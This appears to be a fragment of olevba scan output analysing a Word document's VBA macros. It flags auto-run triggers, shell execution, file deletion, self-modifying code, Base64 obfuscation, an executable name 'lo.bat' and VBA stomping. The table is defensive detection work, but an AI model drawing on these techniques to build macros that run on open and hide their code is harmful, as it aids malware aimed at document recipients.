|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

